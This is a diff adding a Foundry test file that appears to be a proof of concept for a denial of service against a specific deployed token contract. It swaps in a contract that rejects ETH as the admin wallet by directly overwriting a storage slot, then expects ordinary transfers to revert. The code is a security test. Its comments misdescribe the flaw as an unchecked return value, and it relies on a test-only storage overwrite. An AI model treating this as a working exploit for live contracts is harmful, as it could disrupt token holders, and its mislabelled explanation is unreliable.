@@ -1,0 +1,124 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "forge-std/Test.sol";
+
+// Minimal IERC20 interface for JizzJet
+interface IJizzJet {
+    function owner() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function _adminWalletAddress() external view returns (address payable);
+    function uniswapV2Router() external view returns (address);
+    function uniswapV2Pair() external view returns (address);
+    function _maxTxAmount() external view returns (uint256);
+    function swapAndLiquifyEnabled() external view returns (bool);
+    function _taxFee() external view returns (uint256);
+    function _liquidityFee() external view returns (uint256);
+    function excludeFromReward(address) external;
+    function excludeFromFee(address) external;
+    function setSwapAndLiquifyEnabled(bool) external;
+    // note: _setReceiverWallet is external but we don't need it directly
+}
+
+// Malicious contract that will reject ETH (revert on receive)
+contract RejectETH {
+    receive() external payable {
+        revert("I don't want ETH");
+    }
+}
+
+// Basic interface for the UniswapV2Router to check some values
+interface IUniswapV2Router {
+    function factory() external view returns (address);
+    function WETH() external view returns (address);
+}
+
+contract ExploitTest is Test {
+    IJizzJet constant token = IJizzJet(0xf2a7429641d1b49a13dcb7e23b67a1a5101231f2);
+    RejectETH rejecter;
+    address owner;
+    address constant attacker = address(0x1337);
+
+    function setUp() public {
+        // Label for clarity
+        vm.label(address(token), "JizzJet");
+        vm.label(attacker, "Attacker");
+
+        // Get the owner address
+        owner = token.owner();
+        vm.label(owner, "Owner");
+
+        // Deploy the malicious admin contract
+        rejecter = new RejectETH();
+        vm.label(address(rejecter), "RejectETH");
+
+        // Deal some ETH to attacker for gas (optional)
+        deal(attacker, 100 ether);
+    }
+
+    function testUncheckedTransferReturnValue() public {
+        // --- Step 1: Ensure contract has enough tokens to trigger swapAndLiquify ---
+        // The threshold is numTokensSellToAddToLiquidity = 1e18
+        // We'll transfer 2e18 tokens from owner to the token contract
+        uint256 tokensToSend = 2 * 10**18;
+
+        vm.startPrank(owner);
+        token.transfer(address(token), tokensToSend);
+        vm.stopPrank();
+
+        // Verify contract now has tokens
+        uint256 contractBalance = token.balanceOf(address(token));
+        assertGe(contractBalance, tokensToSend, "Contract balance too low");
+
+        // --- Step 2: Change admin wallet to the rejecter contract ---
+        // Storage slot 18 holds _adminWalletAddress
+        // The admin address is stored as bytes32, we need to pack address.
+        // We can simply vm.store the full slot with the address padded to 32 bytes.
+        vm.store(
+            address(token),
+            bytes32(uint256(18)),
+            bytes32(uint256(uint160(address(rejecter))))
+        );
+
+        // Confirm the change
+        address payable newAdmin = token._adminWalletAddress();
+        assertEq(newAdmin, address(rejecter), "Admin not overwritten");
+
+        // --- Step 3: Attempt a transfer that will call swapAndLiquify ---
+        // The swapAndLiquify internal function will call sendBNBToAdmin which uses
+        // address.transfer() without checking the return value.
+        // Because the admin wallet (rejecter) reverts on ETH receive, the whole
+        // transaction should revert. This demonstrates that the unchecked return
+        // value (or rather the lack of fallback handling) leads to a DoS.
+        vm.startPrank(owner);
+        // Transfer a small amount to trigger the swap logic
+        vm.expectRevert("I don't want ETH");  // the revert message from rejecter
+        token.transfer(attacker, 1_000_000); // small amount, but contract balance > threshold
+        vm.stopPrank();
+
+        // If the revert is captured, the test passes, showing the vulnerability.
+    }
+
+    // Optional: show that a normal admin works fine (no revert)
+    function testNormalAdminWorks() public {
+        // Ensure admin is the original (default) admin
+        address payable originalAdmin = token._adminWalletAddress();
+        // We'll give the contract enough tokens again
+        uint256 tokensToSend = 2 * 10**18;
+        vm.prank(owner);
+        token.transfer(address(token), tokensToSend);
+
+        // This transfer should succeed because original admin is payable
+        vm.prank(owner);
+        token.transfer(attacker, 1_000_000);
+        // no revert expected
+        assertTrue(true, "Normal admin should not cause revert");
+    }
+}
+```
